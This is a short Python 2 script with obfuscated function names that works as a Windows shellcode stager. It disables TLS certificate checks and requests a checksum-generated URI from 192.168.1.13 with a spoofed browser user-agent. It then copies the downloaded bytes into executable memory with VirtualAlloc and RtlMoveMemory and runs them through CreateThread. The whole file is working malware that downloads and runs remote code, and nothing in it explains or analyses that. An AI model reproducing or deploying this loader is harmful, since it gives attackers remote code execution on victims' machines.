from ctypes import* 
from urllib2 import urlopen, Request
from string import ascii_letters, digits
from random import sample
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
k = windll.kernel32

def DapohXhzabXopaHsahhvcfgL():
	for x in range(64):
		r = ''.join(sample(ascii_letters + digits, 50))
		for c in r:
			if sum([ord(ch) for ch in r+c]) % 0x100 == 92:
				return r+c

def azSvOpsWyHsgbNtOpsQ():
	try:
		r = Request("https://192.168.1.13:443/"+DapohXhzabXopaHsahhvcfgL(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})
		u = urlopen(r)
		return u.read()
	except Exception as e:
		print(e)


def opsxhHonxBeyHqsdLaO(d):
	dll = bytearray(d)
	bd = (c_char * len(dll)).from_buffer(dll)
	v = k.VirtualAlloc(c_int(0), c_int(len(dll)), c_int(0x3000), c_int(0x40))
	k.RtlMoveMemory(c_int(v), bd, c_int(len(dll)))
	k.WaitForSingleObject(c_int(k.CreateThread(c_int(0), c_int(0), c_int(v), c_int(0), c_int(0), pointer(c_int(0)))), c_int(-1))


dll = azSvOpsWyHsgbNtOpsQ()
opsxhHonxBeyHqsdLaO(dll)